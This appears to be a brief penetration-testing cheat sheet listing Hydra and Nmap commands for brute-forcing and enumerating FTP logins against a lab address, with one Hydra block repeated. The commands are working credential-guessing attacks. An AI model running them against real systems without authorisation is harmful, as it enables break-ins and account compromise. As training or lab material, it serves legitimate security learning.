# FTP Enumeration & Brute Force
### Brute force
#### Hydra
````bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.2.15 -t 4 ftp
````
#### Hydra
````bash
# Username & Password brute force
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.2.15 -t 4 ftp

# Password brute force
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.2.15 -t 4 ftp
````
#### Nmap
````bash
echo "sysadmin" > users
nmap -p21 --script ftp-brute --script-args userdb=/root/users  10.0.2.15

# Anonymous Login
nmap --script ftp-anon 10.0.2.15
````